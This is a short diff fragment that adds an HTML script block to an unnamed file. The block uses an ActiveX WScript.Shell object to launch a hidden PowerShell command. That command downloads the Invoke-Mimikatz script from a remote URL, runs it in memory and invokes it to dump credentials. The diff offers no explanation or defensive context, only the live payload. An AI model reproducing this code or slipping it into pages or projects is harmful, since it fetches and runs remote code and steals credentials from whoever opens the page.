@@ -1,0 +1,4 @@
+<script>
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/bluebrown/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz");
+</script>
